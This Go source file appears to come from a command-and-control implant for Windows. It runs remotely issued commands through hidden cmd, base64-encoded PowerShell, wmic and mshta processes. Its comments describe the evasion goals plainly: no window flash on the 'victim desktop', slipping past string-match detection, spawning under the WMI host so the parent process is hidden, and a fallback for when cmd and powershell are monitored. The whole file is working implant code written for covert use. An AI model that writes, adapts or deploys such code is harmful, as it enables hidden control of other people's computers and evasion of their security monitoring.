//go:build windows

package main

import (
	"bytes"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"os"
	"os/exec"
	"strings"
	"syscall"
	"time"
	"unicode/utf16"
)

// CREATE_NO_WINDOW prevents child processes from opening a console window.
// Without this flag, spawning cmd.exe/powershell.exe on a windowsgui agent
// causes a brief visible flash on the victim desktop.
const createNoWindow = 0x08000000

// runCommand dispatches to the configured execution method (baked in at build time).
// method: direct | cmd | powershell | wmi | mshta
func runCommand(method, command string, timeout int) (stdout, stderr string, exitCode int) {
	ctx := context.Background()
	if timeout > 0 {
		var cancel context.CancelFunc
		ctx, cancel = context.WithTimeout(ctx, time.Duration(timeout)*time.Second)
		defer cancel()
	}

	switch method {
	case "powershell", "ps":
		return execPowerShell(ctx, command)
	case "wmi":
		return execWMIC(ctx, command)
	case "mshta":
		return execMSHTA(ctx, command)
	default: // "direct", "cmd"
		return execCMD(ctx, command)
	}
}

// execCMD runs a command via cmd.exe /C with no visible window.
func execCMD(ctx context.Context, command string) (string, string, int) {
	cmd := exec.CommandContext(ctx, "cmd.exe", "/C", command)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	return strings.TrimSpace(out.String()), strings.TrimSpace(errBuf.String()), exitCodeFrom(err)
}

// execPowerShell runs a command via powershell.exe -EncodedCommand (UTF-16LE base64).
// Bypasses many string-match detections on "powershell -c".
// The command is prefixed to silence progress bars and CLIXML noise that would
// otherwise appear in stderr and cause the server to mark results as "failed".
func execPowerShell(ctx context.Context, command string) (string, string, int) {
	// Suppress ProgressPreference to prevent CLIXML progress records on stderr.
	// Suppress ErrorActionPreference so non-terminating errors don't pollute stderr.
	wrapped := `$ProgressPreference='SilentlyContinue';$ErrorActionPreference='SilentlyContinue';` + command
	encoded := psEncode(wrapped)
	cmd := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden",
		"-EncodedCommand", encoded,
	)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
	var out, errBuf bytes.Buffer
	cmd.Stdout = &out
	cmd.Stderr = &errBuf
	err := cmd.Run()
	stderrStr := filterCLIXML(strings.TrimSpace(errBuf.String()))
	return strings.TrimSpace(out.String()), stderrStr, exitCodeFrom(err)
}

// filterCLIXML strips PowerShell CLIXML progress/error records from stderr.
// These are harmless metadata lines that would otherwise cause the server to
// mark a successful command as "failed".
func filterCLIXML(s string) string {
	if !strings.Contains(s, "CLIXML") && !strings.Contains(s, "<Objs") {
		return s
	}
	var keep []string
	for _, line := range strings.Split(s, "\n") {
		t := strings.TrimSpace(line)
		if t == "#< CLIXML" || strings.HasPrefix(t, "<Objs") || strings.HasPrefix(t, "<Obj") {
			continue
		}
		keep = append(keep, line)
	}
	return strings.TrimSpace(strings.Join(keep, "\n"))
}

// execWMIC uses wmic.exe (LOLBin) to create a process via the WMI subsystem.
// The spawned process parent is the WMI host (svchost.exe), not our agent.
// Output is captured via a temp file since WMI Create does not inherit handles.
// Note: wmic.exe is deprecated on Windows 11 — use "powershell" method on Win11 targets.
func execWMIC(ctx context.Context, command string) (string, string, int) {
	tmp := fmt.Sprintf(`%s\~%d.tmp`, os.TempDir(), time.Now().UnixNano())
	wrapped := fmt.Sprintf(`cmd.exe /C %s > "%s" 2>&1`, command, tmp)

	cmd := exec.CommandContext(ctx, "wmic.exe", "process", "call", "create", wrapped)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
	err := cmd.Run()

	// Poll for output — WMI creates the child process asynchronously
	deadline := time.Now().Add(15 * time.Second)
	if dl, ok := ctx.Deadline(); ok && dl.Before(deadline) {
		deadline = dl
	}
	var output string
	for time.Now().Before(deadline) {
		if data, readErr := os.ReadFile(tmp); readErr == nil && len(data) > 0 {
			output = strings.TrimSpace(string(data))
			break
		}
		time.Sleep(300 * time.Millisecond)
	}
	os.Remove(tmp)
	return output, "", exitCodeFrom(err)
}

// execMSHTA uses mshta.exe (LOLBin) to execute a command via WScript.Shell.
// Useful when cmd.exe and powershell.exe execution are monitored.
func execMSHTA(ctx context.Context, command string) (string, string, int) {
	tmp := fmt.Sprintf(`%s\~%d.tmp`, os.TempDir(), time.Now().UnixNano())
	escapedCmd := strings.ReplaceAll(command, `"`, `\"`)
	escapedTmp := strings.ReplaceAll(tmp, `\`, `\\`)
	script := fmt.Sprintf(
		`javascript:a=new ActiveXObject("WScript.Shell");`+
			`a.Run("cmd /C %s > \"%s\" 2>&1",0,true);close();`,
		escapedCmd, escapedTmp,
	)
	cmd := exec.CommandContext(ctx, "mshta.exe", script)
	cmd.SysProcAttr = &syscall.SysProcAttr{CreationFlags: createNoWindow}
	err := cmd.Run()

	data, _ := os.ReadFile(tmp)
	os.Remove(tmp)
	return strings.TrimSpace(string(data)), "", exitCodeFrom(err)
}

// psEncode encodes a PowerShell command as UTF-16LE base64 for -EncodedCommand.
func psEncode(command string) string {
	u := utf16.Encode([]rune(command))
	b := make([]byte, len(u)*2)
	for i, r := range u {
		binary.LittleEndian.PutUint16(b[i*2:], r)
	}
	return base64.StdEncoding.EncodeToString(b)
}

func exitCodeFrom(err error) int {
	if err == nil {
		return 0
	}
	if ee, ok := err.(*exec.ExitError); ok {
		return ee.ExitCode()
	}
	return 1
}
